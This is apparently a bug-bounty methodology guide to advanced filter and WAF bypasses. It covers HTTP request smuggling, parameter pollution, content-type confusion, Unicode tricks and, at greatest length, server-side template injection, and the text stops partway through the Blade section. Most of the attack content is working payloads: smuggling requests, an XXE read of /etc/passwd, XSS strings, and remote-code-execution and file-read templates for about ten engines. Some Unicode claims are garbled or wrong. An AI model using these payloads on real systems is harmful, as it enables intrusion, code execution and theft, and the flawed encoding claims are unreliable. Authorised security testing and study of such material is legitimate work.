# Advanced Bypass Techniques

A comprehensive guide to bypass techniques that go beyond standard payloads — covering protocol-level, encoding-level, parser-differential, and logic-level evasions. This is part 8 of the 10-part bug bounty methodology series.

## Table of Contents

1. [Parser Differential Attacks](#parser-differential-attacks)
2. [HTTP Protocol Manipulation](#http-protocol-manipulation)
3. [Content-Type Confusion](#content-type-confusion)
4. [Unicode & Encoding Attacks](#unicode--encoding-attacks)
5. [Template Engine Deep Bypass](#template-engine-deep-bypass)
6. [SQL Filter Bypass Deep](#sql-filter-bypass-deep)
7. [Prototype Pollution Advanced](#prototype-pollution-advanced)
8. [JWT Attack Deep](#jwt-attack-deep)
9. [Cache Poisoning Advanced](#cache-poisoning-advanced)
10. [GraphQL Deep Bypass](#graphql-deep-bypass)
11. [SSRF Deep Bypass](#ssrf-deep-bypass)
12. [Checklist](#checklist)

---

## Parser Differential Attacks

The core concept: two parsers disagree on input meaning. The front-end (WAF, CDN, load balancer) interprets the input as safe, while the back-end (application server, framework, database) interprets it as malicious. Every parser differential is a potential bypass.

### HTTP Request Smuggling

**Root cause:** Front-end and back-end servers disagree on request boundaries. One request's body bleeds into the next request's start.

#### CL.TE — Front-end uses Content-Length, back-end uses Transfer-Encoding

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 44
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: internal-target
X-Ignore: X
```

**How it works:**
- Front-end reads 44 bytes: the body including `0\r\n\r\nGET /admin HTTP/1.1\r\nHost: internal-target\r\nX-Ignore: X`
- Back-end sees chunked encoding: `0\r\n\r\n` terminates the first request, then `GET /admin` is parsed as the NEXT request
- The smuggled request can bypass WAF rules applied only to the first request

#### TE.CL — Front-end uses Transfer-Encoding, back-end uses Content-Length

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 3
Transfer-Encoding: chunked

8
SMUGGLED
0
```

**How it works:**
- Front-end sees chunked, processes the body, forwards the full request
- Back-end sees Content-Length: 3, reads only `8\r\n` as the body
- `SMUGGLED\r\n` becomes the start of the next request parsed by the back-end

#### H2.CL — HTTP/2 downgrade smuggling

```http
:method POST
:path / HTTP/1.1
:authority target.com
content-length: 0

POST /admin HTTP/1.1
Host: target.com
Content-Length: 14

GET / HTTP/1.1
Host: target.com
```

**How it works:**
- HTTP/2 framing has no concept of Content-Length — the frame length is the body
- When the front-end downgrades HTTP/2 to HTTP/1.1 for the back-end, it strips frame boundaries
- The Content-Length header in the HTTP/1.1 body is parsed by the back-end
- Front-end sees one HTTP/2 request, back-end sees two HTTP/1.1 requests

#### H2.TE — HTTP/2 with Transfer-Encoding

```http
:method POST
:path / HTTP/1.1
:authority target.com
transfer-encoding: chunked

0

GET /admin HTTP/1.1
Host: target.com
```

**How it works:**
- HTTP/2 rejects Transfer-Encoding at the HTTP/2 layer but the back-end HTTP/1.1 parser may honor it
- Front-end forwards the body as-is, back-end processes chunked encoding

### Detection Techniques

**Timing-based detection:**
```bash
# Send a request with a long body that will "wait" if smuggling works
curl -k "https://target.com/" -H "Transfer-Encoding: chunked" \
  -d $'0\r\n\r\nGET /wait HTTP/1.1\r\nHost: target.com\r\n\r\n'

# If the next request hangs for >30s, smuggling works
curl -k "https://target.com/"
```

**Response-based detection:**
```bash
# Send a smuggled request that generates a matchable response
curl -k "https://target.com/" -H "Transfer-Encoding: chunked" \
  -d $'0\r\n\r\nGET /404 HTTP/1.1\r\nHost: target.com\r\n\r\n'

# Next request returns 404 instead of 200 -> smuggling confirmed
curl -k "https://target.com/"
```

### Request Smuggling Bypass Chains

| Smuggle Type | Impact | Chain With |
|-------------|--------|------------|
| CL.TE | WAF bypass, cache poisoning | Cache key manipulation |
| TE.CL | WAF bypass, auth bypass | Header injection |
| H2.CL | HTTP/2 WAF bypass | Path confusion |
| H2.TE | HTTP/2 to HTTP/1.1 desync | WebSocket upgrade |

### Parameter Pollution

**Root cause:** Different frameworks handle duplicate query/body parameters differently. The front-end validates one value, the back-end uses another.

#### Framework-Specific Behavior

```http
GET /api/user?role=user&role=admin HTTP/1.1
```

| Framework | Behavior | Security Implication |
|-----------|----------|---------------------|
| Apache Tomcat | Takes first value | If WAF checks last, bypass via first |
| PHP | Takes last value | If WAF checks first, bypass via last |
| ASP.NET | Concatenates with comma | `role=user,admin` — injects admin |
| Node.js (Express) | Takes first value | WAF checks last? |
| Python (Flask) | Takes last value | WAF checks first? |
| Ruby on Rails | Creates array `["user", "admin"]` | Type confusion if expecting string |
| Jetty | Takes first value | Same as Tomcat — common back-end |
| Nginx upstream | Passes all values to back-end | Depends on back-end framework |

#### HPP Bypass Patterns

```http
# WAF checks query params, bypass via body
POST /api/user?role=user HTTP/1.1
Content-Type: application/json

{"role": "admin"}

# Duplicate headers
GET /api/user HTTP/1.1
X-Forwarded-For: 127.0.0.1
X-Forwarded-For: 192.168.1.1

# Cookie pollution
Cookie: session=valid; session=admin

# Form array notation (PHP-specific)
POST /api/user HTTP/1.1
Content-Type: application/x-www-form-urlencoded

role[]=user&role[]=admin
```

### Content-Type Confusion

**Root cause:** Front-end and back-end parse the request body differently based on Content-Type header.

#### Multipart vs Form-URLEncoded

```http
# WAF checks form-urlencoded fields
POST /api/profile HTTP/1.1
Content-Type: application/x-www-form-urlencoded

name=test&role=user

# Bypass: Change Content-Type to multipart
POST /api/profile HTTP/1.1
Content-Type: multipart/form-data; boundary=xxx

--xxx
Content-Disposition: form-data; name="name"

test
--xxx
Content-Disposition: form-data; name="role"

admin
--xxx--
```

**Why this works:**
- Some WAFs only parse specific Content-Types
- The application framework may accept both multipart and form-urlencoded
- Multipart parsing can bypass string-length limits and character encoding restrictions

#### JSON vs Form Hybrid

```http
# Some frameworks accept both JSON and form in the same endpoint
POST /api/user HTTP/1.1
Content-Type: application/json

{"name": "test", "role": "admin"}

POST /api/user HTTP/1.1  
Content-Type: application/x-www-form-urlencoded

name=test&role=admin
```

If the WAF only inspects JSON but the application also accepts form data, the form-data request bypasses inspection.

#### Content-Type Override via Header

```http
POST /api/user HTTP/1.1
Content-Type: application/x-www-form-urlencoded
X-Content-Type-Override: application/json

name=test&role=admin
```

Some frameworks check `X-Content-Type-Override` or `Content-Type-Override` headers, allowing the attacker to bypass the stated Content-Type.

### JSON/XML Parser Differentials

#### Duplicate Keys in JSON

```json
{
  "role": "user",
  "role": "admin"
}
```

| Parser | Behavior |
|--------|----------|
| Python json | Takes last value (`admin`) |
| Go encoding/json | Takes last value (`admin`) |
| Node.js JSON.parse | Takes last value (`admin`) |
| Java Jackson | Takes last value (`admin`) |
| .NET Newtonsoft | Takes last value (`admin`) |
| PHP json_decode | Takes last value (`admin`) |
| Ruby JSON.parse | Raises error (no duplicate keys) |
| Python Flask request.json | Takes first value (`user`) |

The WAF may check the first value, the back-end may use the last.

#### Comments in JSON

```json
{
  "role": /* bypass */ "admin"
}
```

Standard JSON doesn't support comments, but some parsers do:
- Google GSON: ignores comments
- Jackson with comment-enabled: strips comments
- WAF using strict JSON.parse: the comment is a syntax error, request is skipped

#### Whitespace in JSON Keys

```json
{
  "rol\u0065": "admin"
}
```

Unicode escapes in keys can bypass WAF regexes that look for exact key names.

#### XML External Entity (XXE) as Parser Differential

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<user>
  <role>&xxe;</role>
</user>
```

If the application parses XML but the WAF only inspects JSON, XML-based payloads bypass inspection entirely.

#### XML Comments in Tags

```xml
<ro<!--comment-->le>admin</ro<!--comment-->le>
```

Some XML parsers strip comments before processing, while WAFs scan the raw XML and may miss tags split by comments.

### Unicode Normalization Differences

**Root cause:** CDN, WAF, and application may normalize Unicode differently, creating bypass opportunities.

#### Normalization Forms

| Form | Description | Security Implication |
|------|-------------|---------------------|
| NFC | Canonical composition | Composed form — most common |
| NFD | Canonical decomposition | Decomposes characters — e.g., `é` → `e` + combining accent |
| NFKC | Compatibility composition | Removes stylistic variants |
| NFKD | Compatibility decomposition | Most aggressive — decomposes everything |

#### WAF vs Application Normalization

```http
# WAF checks: /admin
# Application receives: /admin
# But with Unicode tricks:

# Full-width characters bypass ASCII checks
GET /ａｄｍｉｎ HTTP/1.1
# WAF sees /ａｄｍｉｎ (doesn't match /admin pattern)
# Application normalizes to /admin

# WAF doesn't normalize, application does
GET /admin%c2%a0 HTTP/1.1  
# %c2%a0 is non-breaking space (U+00A0)
# WAF checks /admin%c2%a0 — doesn't match path rules
# Application strips/ignores the trailing space → routes to /admin

# Case normalization bypass
GET /%41dmin HTTP/1.1  
# %41 = 'A' — WAF checks lowercase patterns only
```

#### Unicode Normalization in String Comparison

```python
# Python: 'café' in NFC != 'café' in NFD
# NFKC normalizes: 'ℌ' (U+2118) → 'P' (U+0050)
# 
# If WAF blocks "password" but application normalizes after WAF:
"pаssword"  # Cyrillic 'а' (U+0430) looks identical to Latin 'a' (U+0061)
# WAF sees: pаssword (not in blocklist)
# Application normalizes: password (matches blocklist target)
```

### Charset Handling Differences

**Root cause:** Server declares one charset (e.g., `Content-Type: text/html; charset=ISO-8859-1`) but the application internally converts to UTF-8, creating bypass windows.

#### Charset Mismatch Example

```http
POST /api/search HTTP/1.1
Content-Type: application/x-www-form-urlencoded; charset=iso-8859-1

q=%27%20OR%201%3D1--  # Latin-1 encoded SQL injection
```

If the WAF decodes as UTF-8 but the application decodes as ISO-8859-1, certain byte sequences are interpreted differently.

#### Multi-byte Character Truncation

```http
# Shift-JIS (Japanese encoding) quirk:
# 0x81 0x40 = 'A' in Shift-JIS
# 0x81 0x22 = 0x81 is the lead byte, 0x22 is '"' 
# Shift-JIS parser sees one character (0x81 0x22)
# UTF-8 parser sees 0x81 (invalid) + 0x22 ('"')
# This breaks out of a SQL string early!

# WAF decodes as UTF-8: sees valid string
# Application decodes as Shift-JIS: 0x22 terminates the string
# SQL injection: "=" becomes SQL syntax

PUT /api/user HTTP/1.1
Content-Type: application/json; charset=shift_jis

{"name": "test\x81\x22 OR 1=1-- "}
```

#### BOM (Byte Order Mark) Injection

```http
PUT /api/user HTTP/1.1  
Content-Type: application/json

\xEF\xBB\xBF{"role": "admin"}
```

The UTF-8 BOM (`\xEF\xBB\xBF`) at the start of a JSON body may cause:
- WAF: fails to parse JSON due to unexpected bytes, skips inspection
- Application: ignores BOM and processes the JSON normally

---

## HTTP Protocol Manipulation

Beyond smuggling — manipulating HTTP protocol features to bypass security controls.

### HTTP/2 Downgrade Attacks

When front-end speaks HTTP/2 but back-end speaks HTTP/1.1, the downgrade process introduces bypass vectors.

#### Header Name Injection via Pseudo-Headers

```http
# HTTP/2 request
:method POST
:path /api/user
:authority target.com
content-type: application/json
:role admin  # Pseudo-header injected into HTTP/1.1 header set
```

During downgrade, pseudo-headers may be written into the HTTP/1.1 header block. If the back-end reads `:role` as a legitimate header, it bypasses application-level checks.

#### HTTP/2 Padding Bypass

```http
# HTTP/2 allows padding bytes in frames
# WAF sees clean headers, back-end receives padded version

:method POST
:path /api/user/p\x00\x00\x00rofile
```

Padding can hide path segments from WAF inspection.

#### HTTP/2 Stream ID Manipulation

```http
# HTTP/2 streams are numbered. Odd = client-initiated, Even = server-initiated
# Sending a request on an even stream ID may bypass some WAFs
# that only inspect odd streams
```

### HPACK Compression Oracle

**Concept:** HTTP/2 uses HPACK to compress headers. The compression uses a dynamic table. If an attacker can observe the compressed output size, they can infer header values.

```http
# If cookie values are compressed with HPACK:
# Authenticated users have cookie: session=abc123
# The WAF compares compressed size of requests:
#   - Request with session=abc123 → smaller (matches dynamic table)
#   - Request with session=xyz789 → larger (no table match)
#
# This is a subtle timing/size side channel
```

### HTTP/3 (QUIC) Handling Differences

HTTP/3 runs over QUIC (UDP). Many WAFs and reverse proxies don't inspect QUIC traffic:

```bash
# Test if server accepts HTTP/3
curl --http3 https://target.com/

# If it responds but WAF is HTTP/1.1/2 only:
#   - Send attacks over HTTP/3
#   - WAF never sees the payload
```

Servers may treat HTTP/3 as internal or trusted due to infrequent inspection.

### H2C Upgrade Smuggling

H2C (HTTP/2 Cleartext) starts as HTTP/1.1 and upgrades:

```http
GET / HTTP/1.1
Host: target.com
Upgrade: h2c
HTTP2-Settings: AAMAAABkAARAAAAAAAIAAAAA
Connection: Upgrade, HTTP2-Settings

# If server upgrades to HTTP/2, subsequent frames are HTTP/2 on cleartext
# WAF processing the initial HTTP/1.1 request may not process HTTP/2 frames
# This allows smuggling arbitrary HTTP/2 requests
```

### WebSocket Upgrade Abuse

```http
# WebSocket handshake bypasses normal HTTP processing
GET /api/admin HTTP/1.1
Host: target.com
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==
Sec-WebSocket-Version: 13
```

**Why this works:**
- Many WAFs treat WebSocket upgrades as benign or skip inspection
- Back-end frameworks may process the request normally even without completing the WebSocket handshake
- If the back-end sees `Upgrade: websocket` and applies different logic, auth checks may be skipped

```http
# Some frameworks skip auth on WebSocket upgrades
GET /api/users/ssh-public-key HTTP/1.1
Host: admin-panel.internal
Upgrade: websocket  # Convince the proxy this is a WS request
Connection: Upgrade
```

### Transfer-Encoding Variations

Chunked encoding parsing differs across servers:

```http
# Case variation — WAF checks for "chunked" in lowercase
Transfer-Encoding: Chunked
Transfer-Encoding: CHUNKED
Transfer-Encoding: ChuNkEd

# Obsolete transfer codings
Transfer-Encoding: chunked, identity
Transfer-Encoding: chunked, foobar

# Multiple Transfer-Encoding headers
Transfer-Encoding: x
Transfer-Encoding: chunked

# Spaces and tabs
Transfer-Encoding:    chunked
Transfer-Encoding: chunked; param=value
```

| Server | Accepts `Chunked`? | Accepts `chunked, x`? | Accepts multi-header? |
|--------|-------------------|----------------------|----------------------|
| Apache | Yes | No | No — uses first |
| Nginx | Yes | Yes — ignores unknown | No — uses last |
| IIS | Yes | No | Yes — concatenates |
| Node.js http | No | No | No — uses first |
| HAProxy | Yes | No | No — rejects |

### Expect: 100-Continue Abuse

```http
POST /api/upload HTTP/1.1
Host: target.com
Expect: 100-continue
Content-Length: 99999999

# WAF may:
# 1. Forward the 100 Continue response
# 2. Wait for the full body
# 3. Start inspection

# Attack: Never send the body
# Send 100 Continue response, then a NEW request
# WAF is waiting for body, attacker sends crafted request
```

### Connection Header Manipulation

```http
# tell proxy not to keep connection alive, confusing state
GET /admin HTTP/1.1
Host: target.com
Connection: keep-alive, close  # Contradictory
Connection: upgrade  # Tell proxy to upgrade, skip processing

# Headers as body separator
POST / HTTP/1.1
Host: target.com
Connection: x
Content-Length: 5

admin
GET / HTTP/1.1
Host: target.com
Connection: x  # Tear down connection after this header
```

---

## Content-Type Confusion

How different frameworks parse the same body differently based on Content-Type — one of the most reliable bypass categories.

### Application/X-WWW-Form-URLEncoded vs Multipart Differential

Many frameworks accept both, but parse them differently:

```http
# URL-encoded: WAF sees values as-is
POST /api/user HTTP/1.1
Content-Type: application/x-www-form-urlencoded

name=<script>alert(1)</script>&role=admin

# Multipart: values are in MIME sections, WAF may not parse deeply
POST /api/user HTTP/1.1
Content-Type: multipart/form-data; boundary=--boundary

----boundary
Content-Disposition: form-data; name="name"

<script>alert(1)</script>
----boundary
Content-Disposition: form-data; name="role"

admin
----boundary--
```

**Key differences:**
- URL-encoded: `+` is space, `%20` is space, `%00` is null byte
- Multipart: `+` is literal, newlines are literal, Content-Disposition parameters can vary
- Multipart allows per-part Content-Type headers
- Multipart allows filename parameters

#### Per-Part Content-Type Override

```http
POST /api/profile HTTP/1.1
Content-Type: multipart/form-data; boundary=xxx

--xxx
Content-Disposition: form-data; name="avatar"
Content-Type: image/svg+xml

<svg xmlns="http://www.w3.org/2000/svg">
  <script>alert(1)</script>
</svg>
--xxx--
```

If the application processes all parts as form fields, but the WAF only inspects text/plain parts, the SVG part bypasses inspection.

#### Multipart Boundary Injection

```http
POST /api/user HTTP/1.1
Content-Type: multipart/form-data; boundary=a
Content-Disposition: form-data; name="name"

test
--b
Content-Disposition: form-data; name="role"

admin
--b--
--a--
```

If the back-end accepts a different boundary than the one declared, an attacker can inject additional parts.

### JSON vs Form Parsing in Hybrid Frameworks

Some frameworks accept multiple Content-Types for the same endpoint:

```python
# Flask example — both work:
@app.route('/api/user', methods=['POST'])
def create_user():
    if request.is_json:
        data = request.get_json()
    else:
        data = request.form
    # Process data...

# Django REST framework — dual parser:
class UserViewSet(ModelViewSet):
    parser_classes = [JSONParser, FormParser]
```

```http
# WAF inspects JSON body
POST /api/user HTTP/1.1
Content-Type: application/json

{"name": "test", "role": "user"}

# Bypass: send as form data
POST /api/user HTTP/1.1
Content-Type: application/x-www-form-urlencoded

name=test&role=admin
```

### XML vs JSON in SOAP/REST Hybrid APIs

```http
# REST endpoint accepts both:
POST /api/users HTTP/1.1
Content-Type: application/json
Accept: application/json

{"role": "admin"}

POST /api/users HTTP/1.1
Content-Type: application/xml
Accept: application/xml

<user><role>admin</role></user>
```

If the WAF only inspects JSON payloads (most common), XML bypasses inspection.

### YAML Parsing in Web Context

```http
# Some frameworks accept YAML (e.g., Rails, Python with PyYAML)
POST /api/config HTTP/1.1
Content-Type: text/yaml

role: admin
!!python/object:__main__.User
  role: admin
```

YAML deserialization can:
- Run arbitrary constructors (Python `!!python/object`, Ruby `!ruby/object`)
- Bypass JSON-focused WAFs
- Access deserialization RCE

### Content-Type Header Variations

```http
# Content-Type with parameters
Content-Type: application/json; charset=utf-8
Content-Type: application/json; boundary=ignored

# Alternate MIME types
Content-Type: text/json
Content-Type: */*
Content-Type: text/plain
Content-Type: application/x-json
Content-Type: application/vnd.api+json

# Missing Content-Type — some frameworks default to JSON
# WAF may skip body inspection entirely

# Content-Type with BOM
Content-Type: application/json; charset=utf-8-bom
```

---

## Unicode & Encoding Attacks

Encoding-based bypasses exploit differences in how systems interpret byte sequences.

### UTF-8 Overlong Sequences

UTF-8 encodes code points in 1-4 bytes. Overlong sequences encode a code point in more bytes than necessary — they're supposed to be rejected, but some parsers accept them.

```python
# ASCII '/' encoded as overlong 2-byte UTF-8 sequence
# Standard: 0x2F = '/'
# Overlong: 0xC0 0xAF = '/' in 2 bytes

# If WAF checks for '/' in path but application accepts overlong:
GET /%C0%AFadmin HTTP/1.1
# WAF sees %C0%AFadmin — no path traversal
# Application decodes to /admin — routes to admin page
```

| Character | Standard UTF-8 | Overlong 2-byte | Overlong 3-byte |
|-----------|---------------|-----------------|-----------------|
| `/` | 0x2F | 0xC0 0xAF | 0xE0 0x80 0xAF |
| `.` | 0x2E | 0xC0 0xAE | 0xE0 0x80 0xAE |
| `\` | 0x5C | 0xC1 0x9C | 0xE0 0x81 0x9C |
| `'` | 0x27 | 0xC0 0xA7 | 0xE0 0x80 0xA7 |
| `"` | 0x22 | 0xC0 0xA2 | 0xE0 0x80 0xA2 |
| `<` | 0x3C | 0xC0 0xBC | 0xE0 0x80 0xBC |

### UTF-16 Surrogate Injection

Surrogate pairs (U+D800-U+DFFF) are invalid in UTF-8 but appear in UTF-16 encoded data:

```http
# Surrogate injection in JSON (JavaScript allows surrogates in strings)
POST /api/search HTTP/1.1
Content-Type: application/json; charset=utf-8

{"q": "\uD800\uDC00 OR 1=1--"}
```

- `\uD800` and `\uDC00` individually are invalid Unicode (surrogates)
- Together they form a supplementary character (U+10000)
- Some JSON parsers accept surrogates, some reject them
- WAF may not process the JSON correctly if it encounters invalid surrogates

```http
# DB-level bypass: some databases store UTF-16 internally
# If surrogate pairs are preserved, SQL comparisons may fail
# WAF: sees proper strings, passes
# DB: surrogates break string comparison, bypass injection defense
```

### Unicode Normalization Bypass

NFD (Canonical Decomposition) decomposes characters into base + combining marks:

```
Character 'é' (U+00E9) in NFC:
  → 'é' (single code point)

Character 'é' (U+00E9) in NFD:
  → 'e' (U+0065) + combining acute accent (U+0301)
```

**WAF bypass via NFD:**
```http
# WAF blocks: "password"
# NFD decomposed input: "pаssword" (Cyrillic 'а')
POST /api/login HTTP/1.1
Content-Type: application/json

{"password": "p\u0430ssword"}
# WAF: checks "pаssword" — not in blocklist
# Application after NFD: "password" — matches stored value
```

**NFKC bypass:**
```http
# NFKC maps "①" (U+2460) → "1"
# NFKC maps "₂" (U+2082) → "2"
# NFKC maps "ℌ" (U+2118) → "P"
# NFKC maps "ß" (U+00DF) → "ss"
# 
# WAF blocks: "SELECT"
# Input: "ℰLECT" (script capital P = U+2118 = looks like 'S'? No)
# Better: use mathematical script letters

# WAF blocks SELECT:
# Input: "𝗦𝗘𝗟𝗘𝗖𝗧" (mathematical sans-serif bold capital)
# WAF: doesn't match "SELECT"
# After NFKC normalization: "SELECT"
```

### BOM Injection

Byte Order Mark (BOM) at the start of content can bypass string comparisons:

```http
# UTF-8 BOM: EF BB BF
POST /api/admin HTTP/1.1

\xEF\xBB\xBF{"role": "admin"}

# WAF regex: ^\{.*"role".*"admin".*\}$
# With BOM: ^\xEF\xBB\xBF\{...  — doesn't match WAF pattern
# Application: ignores BOM in JSON parsing
```

**BOM usage for string comparison bypass:**
```http
# PHP string comparison: "abc" == "\xEF\xBB\xBFabc" → false
# But json_decode ignores BOM

# Application code:
# if ($input->role === "admin") { ... }
# WAF sees BOM{"role":"admin"}
# Application sees {"role":"admin"} after JSON decode
```

### CESU-8 (Compatibility Encoding Scheme for UTF-16)

CESU-8 encodes characters outside BMP as surrogate pairs in UTF-8 style:
- U+10000 → `\xED\xA0\x80\xED\xB0\x80` (6 bytes, surrogate pair encoded as UTF-8)

MySQL's `utf8mb3` charset uses CESU-8 internally (not true UTF-8):

```sql
-- MySQL utf8mb3 truncates 4-byte UTF-8 characters
-- '𝄞' (U+1D11E, MUSICAL SYMBOL G CLEF) in 4-byte UTF-8
-- Stored in utf8mb3: truncated or replaced with '?'
-- 
-- If validation happens before storage, but retrieval differs:
-- Input: '𝄞' OR 1=1-- 
-- WAF: sees the full 4-byte character, passes
-- MySQL: truncates to '' OR 1=1-- → SQL injection
```

### Combining Characters

Combining characters modify the preceding character:

```
"alert" → "a̷l̷e̷r̷t̷" (each character has combining long stroke overlay U+0336)
```

```html
<!-- WAF blocks: <script>alert(1)</script> -->
<!-- Combining mark bypass: -->
<scr​ipt>alert(1)</script>
<!-- Zero-width space (U+200B) between scr and ipt -->
<!-- WAF regex: <script> → doesn't match -->
<!-- Browser HTML parser: ignores zero-width space in tags -->
```

List of zero-width / invisible characters:
| Code Point | Name | Use Case |
|-----------|------|----------|
| U+200B | Zero Width Space | Break up keywords |
| U+200C | Zero Width Non-Joiner | Break up keywords |
| U+200D | Zero Width Joiner | Combine characters |
| U+FEFF | Zero Width No-Break Space (BOM) | File start injection |
| U+2060 | Word Joiner | Invisible separator |
| U+2061 | Function Application | Mathematical spacing |
| U+2062 | Invisible Times | Mathematical spacing |
| U+2063 | Invisible Separator | Mathematical spacing |
| U+2064 | Invisible Plus | Mathematical spacing |

### Homoglyph Attacks

Characters that look identical but have different code points:

```python
# Latin 'a' (U+0061) vs Cyrillic 'а' (U+0430)
print('a' == 'а')  # False — one is Latin, one is Cyrillic

# Common homoglyphs:
# 'o' (U+006F) vs 'о' (U+043E, Cyrillic o)
# 'e' (U+0065) vs 'е' (U+0435, Cyrillic e)
# 'c' (U+0063) vs 'с' (U+0441, Cyrillic s)
# 'p' (U+0070) vs 'р' (U+0440, Cyrillic er)
# 'x' (U+0078) vs 'х' (U+0445, Cyrillic kha)
```

```http
# Bypass hostname-based WAF rules:
# WAF rule blocks: "admin.example.com"
# Request to: "аdmin.example.com" (Cyrillic 'а' at start)
# DNS resolves differently or same?
# If WAF checks URL character-by-character, it won't match

# SQL injection bypass:
# WAF blocks: "admin"
# Use homoglyph in query: "аdmin" → just as effective if DB handles Unicode
```

### Right-to-Left Override (U+202E)

The Unicode RTL override character flips display order:

```
U+202E + "admin" → displayed as "nimda"
```

```javascript
// Social engineering: hidden extensions
// Displayed as: "resume.pdf"
// Actual name: "resume\u202Exe.doc.pdf"
// In RTL: "resume.pdf.cod.e\u202Eemuser"
// The RTL override reorders: "resume" + RTL + "exe.doc.pdf"
// Displayed as: "resume.pdf"  (the .exe is hidden)

// Code injection via display reversal:
var code = "nimda" + "\u202E" + "resu"
// This looks like "resumadmin" when rendered but is actually "nimdatesu"
// If processed by a parser that doesn't handle RTL, the code is reversed
```

---

## Template Engine Deep Bypass

Template injection bypasses specific to each engine.

### Jinja2

Standard SSTI: `{{ config }}` — but when `__builtins__` or `__globals__` are restricted:

```python
# Bypass via get_flashed_messages
{{ get_flashed_messages.__globals__.__builtins__.open("/etc/passwd").read() }}

# Bypass via lipsum
{{ lipsum.__globals__["os"].popen("id").read() }}

# Bypass via namespace
{{ namespace.__init__.__globals__.builtins.open("/etc/passwd").read() }}

# Bypass via cycler
{{ cycler.__init__.__globals__.os.popen("id").read() }}

# Bypass via joiner
{{ joiner.__init__.__globals__.os.popen("id").read() }}

# Bypass via config attribute
{{ config.__class__.__init__.__globals__["os"].popen("id").read() }}

# Bypass via request attribute
{{ request.application.__globals__.__builtins__.__import__("os").popen("id").read() }}

# Bypass via url_for
{{ url_for.__globals__["os"].popen("id").read() }}

# Bypass via get_flashed_messages (alternative)
{{ get_flashed_messages.__globals__.__builtins__.__import__("subprocess").check_output("id", shell=True) }}
```

**Common restricted globals bypass:**
```python
# When __builtins__ is None or restricted:
{{ ''.__class__.__mro__[1].__subclasses__() }}
# Find <class 'subprocess.Popen'> or <class 'os._wrap_close'>
# Then:
{{ ''.__class__.__mro__[1].__subclasses__()[X](['id'], stdout=-1).communicate() }}
```

### Twig (Symfony)

```php
# Basic access
{{ _self }}
{{ _context }}
{{ _charset }}

# Bypass via sort filter (old versions — CVE-2019-XXX)
{{ ["id"]|sort("system") }}

# Bypass via map filter
{{ ["id"]|map("system") }}

# Bypass via filter filter
{{ ["id"]|filter("system") }}

# Bypass via _self.env
{{ _self.env.registerUndefinedFilterCallback("exec") }}
{{ _self.env.getFilter("id; cat /etc/passwd") }}

# Bypass via _self.env (newer syntax)
{{ _self.env.registerUndefinedFunctionCallback("system") }}
{{ _self.env.getFunction("id") }}

# Bypass via template include with path traversal
{{ include("/etc/passwd") }}

# Bypass via __toString / format
{{ "rce"|format("id") }}
```

### Freemarker (Java)

```java
// Standard RCE:
<#assign ex = "freemarker.template.utility.Execute"?new()>
${ ex("id") }

// Bypass via ?api (security restricted in newer versions)
<#assign class = "?api"?new()>
${ class }

// Bypass via ?eval hash access
${ "freemarker.template.utility.Execute"?new()("id") }

// Bypass via built-ins
<#assign objectConstructor = "java.lang.ProcessBuilder"?new()>
${ objectConstructor("id").start() }

// Bypass via Thread access
<#assign thread = "java.lang.Thread"?new()>
${ thread.getClass().forName("java.lang.Runtime").getMethod("exec", "java.lang.String").invoke(...) }

// Bypass via file reading
<#assign file = "java.io.File"?new("/etc/passwd")>
${ file.read()?join("\n") }

// Bypass via ScriptEngine
<#assign engine = "javax.script.ScriptEngineManager"?new().getEngineByName("js")>
${ engine.eval("java.lang.Runtime.getRuntime().exec('id')") }
```

### ERB (Ruby on Rails)

```ruby
# Standard RCE
<%= system("id") %>
<%= exec("id") %>
<%= `id` %>

# Bypass via Kernel binding
<%= binding.eval("system('id')") %>

# Bypass via class hierarchy
<%= "".class.ancestors.find { |c| c.name == "Kernel" }.instance_method(:system).bind(self).call("id") %>

# Bypass via TOPLEVEL_BINDING
<%= TOPLEVEL_BINDING.eval("system('id')") %>

# Bypass via IO
<%= IO.popen("id").read %>

# Bypass via Open3
<%= require "open3"; Open3.popen3("id") { |i,o,e,t| o.read } %>

# Bypass via File.read
<%= File.read("/etc/passwd") %>
```

### Thymeleaf (Java/Spring)

Thymeleaf uses expression preprocessing with `__${...}__` syntax:

```html
<!-- Standard expression -->
<p th:text="${param.msg}"></p>

<!-- Expression preprocessing bypass -->
<!-- Input: ?msg=__${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec("id").getInputStream()).useDelimiter("\\A").next()}__ -->
<!-- Thymeleaf preprocesses __${...}__ before evaluating the template -->
```

```html
<!-- Bypass via expression preprocessing in URL -->
<a th:href="@{${param.url}}">Link</a>
<!-- Input: ?url=__${...}__ -->

<!-- Bypass via fragment inclusion -->
<div th:include="${param.fragment}"></div>
<!-- Input: ?fragment=__${...}__ -->

<!-- Bypass via unescaped text -->
<div th:utext="${param.content}"></div>
```

### Pug (formerly Jade)

```javascript
// Pug template inline JS
- var x = 1
p= x

// JS interpolation
p #{1 + 1}

// Bypass via require in Pug
- var fs = require('fs')
p= fs.readFileSync('/etc/passwd')

// Bypass via global process
- var exec = require('child_process').execSync
p= exec('id')

// Bypass via constructor chain
p #{this.constructor.constructor('return process')().mainModule.require("child_process").execSync("id")}
```

### Mako (Python)

```python
# Standard RCE
${self.module.cache}

# Bypass via namespace import
<%namespace import="*" module="os"/>
${system("id")}

# Bypass via self.module
${self.module.cache.impl.namespace["os"].popen("id").read()}

# Bypass via Template global
${self.__class__.__module__}

# Bypass via Context
${context["os"].popen("id").read()}

# Bypass via inline expression
<%!
    import os
    output = os.popen("id").read()
%>
${output}

# Bypass via page args
<%page args="x=__import__('os').popen('id').read()"/>
${x}
```

### Smarty (PHP)

```php
// Standard {php} tags (deprecated but often enabled)
{php}echo system("id");{/php}

// Bypass via {literal} — prevents Smarty parsing of enclosed content
{literal}{/literal}{php}echo system("id");{/php}

// Bypass via $smarty variable
{$smarty.now}
{$smarty.template_object}

// Bypass via self
{self::getTemplateVars()}

// Bypass via const
{Smarty::$_SMARTY3_STANDARDS}
```

### Nunjucks (JavaScript/Node.js)

```javascript
// Standard RCE via constructor
{{ "".constructor.constructor("return process")().mainModule.require("child_process").execSync("id") }}

// Bypass via range
{% set x = "".constructor.constructor("return process")().mainModule.require("child_process").execSync("id") %}
{{ x }}

// Bypass via template includes
{% include "/etc/passwd" %}
```

### Blade (Laravel/PHP)

```php
// Service injection
